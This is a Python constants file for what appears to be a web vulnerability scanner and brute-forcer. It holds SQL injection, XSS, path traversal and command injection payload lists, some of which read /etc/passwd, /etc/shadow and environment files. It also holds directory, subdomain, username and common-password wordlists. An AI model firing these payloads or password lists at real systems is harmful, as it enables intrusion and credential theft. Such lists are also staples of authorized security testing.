TOP_PORTS = {
    21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",110:"POP3",
    111:"RPCBind",135:"MSRPC",139:"NetBIOS",143:"IMAP",443:"HTTPS",445:"SMB",
    993:"IMAPS",995:"POP3S",1433:"MSSQL",1521:"Oracle",2049:"NFS",2181:"ZooKeeper",
    3306:"MySQL",3389:"RDP",5432:"PostgreSQL",5900:"VNC",5984:"CouchDB",
    6379:"Redis",6443:"K8s",8000:"HTTP-Alt",8080:"HTTP-Proxy",8443:"HTTPS-Alt",
    8888:"HTTP-Alt2",9090:"WebConsole",9200:"Elasticsearch",9300:"ES-Transport",
    11211:"Memcached",27017:"MongoDB",28017:"MongoDB-Web",50000:"SAP",
}

SQLI_PAYLOADS = [
    "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*", "\" OR \"1\"=\"1",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--", "1' AND '1'='1",
    "1' AND '1'='2", "' OR 1=1--", "' OR 1=1#", "1; DROP TABLE--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "1' WAITFOR DELAY '0:0:5'--", "1'; WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--", "1' AND SLEEP(5)#",
    "' UNION SELECT @@version--", "' UNION SELECT user()--",
    "1 AND (SELECT COUNT(*) FROM sysusers AS sys1)=1--",
    "' OR ''='", "admin'--", "' OR 1=1 LIMIT 1--",
]

SQL_ERRORS = [
    "sql syntax","mysql_fetch","mysql_num","ORA-01756","ORA-00933",
    "SQLite3::query","pg_query","pg_fetch","unclosed quotation",
    "Microsoft OLE DB","ODBC SQL Server","Syntax error in string",
    "quoted string not properly","SQLSTATE","DBD::","Warning: mysql",
    "supplied argument is not a valid MySQL","You have an error in your SQL",
    "near \"'\"","unterminated quoted","PostgreSQL.*ERROR",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "\"><img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=javascript:alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<details open ontoggle=alert('XSS')>",
    "'-alert('XSS')-'",
    "<math><mtext><table><mglyph><style><img src=x onerror=alert('XSS')>",
]

LFI_PAYLOADS = [
    "../../../etc/passwd", "../../../../etc/passwd",
    "../../../../../etc/passwd", "../../../../../../etc/passwd",
    "....//....//....//etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd", "/etc/shadow", "/proc/self/environ",
    "....\\....\\....\\windows\\system32\\drivers\\etc\\hosts",
    "php://filter/convert.base64-encode/resource=index",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
]

CMDI_PAYLOADS = [
    "; id", "| id", "&& id", "|| id", "`id`", "$(id)",
    "; cat /etc/passwd", "| cat /etc/passwd",
    "; whoami", "| whoami", "&& whoami",
    "; uname -a", "| uname -a",
    "; ls -la /", "| ls -la /",
    "%0aid", "%0a id",
]

DIRS = [
    "admin","login","dashboard","wp-admin","wp-login.php","administrator",
    "phpmyadmin","pma","config","backup","db","database","api","v1","v2",
    "test","dev","staging",".git",".env",".htaccess","robots.txt",
    "sitemap.xml","server-status","server-info",".svn",".DS_Store",
    "uploads","files","images","img","css","js","assets","static",
    "cgi-bin","bin","tmp","temp","logs","log","error","debug",
    "console","shell","cmd","exec","system","manager","control",
    "panel","cpanel","webmail","mail","ftp","ssh",".well-known",
    "wp-content","wp-includes","xmlrpc.php","wp-config.php.bak",
    "config.php","config.php.bak","database.sql","dump.sql",
    "backup.zip","backup.tar.gz","site.zip",".git/config",
]

PASSWORDS = [
    "password","123456","12345678","qwerty","abc123","monkey","1234567",
    "letmein","trustno1","dragon","baseball","iloveyou","master","sunshine",
    "ashley","bailey","shadow","123123","654321","superman","qazwsx",
    "michael","football","password1","password123","admin","admin123",
    "root","toor","pass","test","guest","master","changeme","hello",
    "welcome","login","princess","starwars","solo","qwerty123",
    "passw0rd","p@ssword","1q2w3e4r","1qaz2wsx","zaq1xsw2",
    "password!","P@ssw0rd","Summer2024","Winter2024","Spring2024",
]

USERNAMES = ["admin","root","user","test","guest","administrator","webmaster","sysadmin","operator","support"]

SUBDOMAINS = [
    "www","mail","ftp","localhost","webmail","smtp","pop","ns1","ns2",
    "blog","dev","shop","api","app","portal","admin","test","staging",
    "cdn","static","media","img","docs","wiki","forum","support",
    "help","status","dashboard","panel","control","manage","login",
    "auth","sso","vpn","proxy","gateway","firewall","router","switch",
    "server","db","database","mysql","postgres","redis","mongo",
    "elastic","kibana","grafana","jenkins","git","gitlab","docker",
    "k8s","kubernetes","aws","s3","cloud","mobile","m","wap",
]

G = "\033[38;5;34m"
G2 = "\033[38;5;82m"
R = "\033[38;5;160m"
R2 = "\033[38;5;196m"
R3 = "\033[38;5;88m"
RD = "\033[38;5;124m"
GD = "\033[38;5;220m"
W = "\033[97m"
D = "\033[90m"
B = "\033[1m"
E = "\033[0m"
